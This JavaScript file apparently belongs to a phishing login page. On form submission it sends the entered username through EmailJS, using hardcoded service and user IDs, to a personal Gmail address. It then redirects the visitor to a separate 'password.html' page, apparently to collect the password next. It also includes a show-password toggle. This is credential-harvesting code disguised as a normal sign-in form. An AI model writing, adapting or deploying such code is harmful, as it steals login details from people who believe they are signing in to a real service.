// emailjs.init("");
const username = document.querySelector("#username");
const btn = document.querySelector("button");
btn.onclick = () => {
  btn.innerHTML = "Loading...";
};
const serviceId = "service_ink8oct";
const userId = "XVhMP5HP3tCJi4vQe";
const templateId = "template_z3jgdng";
document.getElementById("login").onsubmit = function (event) {
  event.preventDefault();
  const emailParams = {
    to_name: "jpgotswagg644@gmail.com",
    username: username.value,
  };
  console.log(emailParams);
  console.log(emailParams);
  emailjs.send(serviceId, templateId, emailParams, userId).then(
    function (response) {
      console.log("Sent successfully:", response);
      username.value = "";
      location.href = "/password.html";
    },
    function (error) {
      console.log("Failed to send:", error);
    }
  );
};

const eye = document.querySelector(".formInput i.fa-eye");

eye.onclick = () => {
  if (password.type === "password") {
    password.type = "text";
    eye.classList.replace("fa-eye", "fa-eye-slash");
  } else {
    password.type = "password";
    eye.classList.replace("fa-eye-slash", "fa-eye");
  }
};
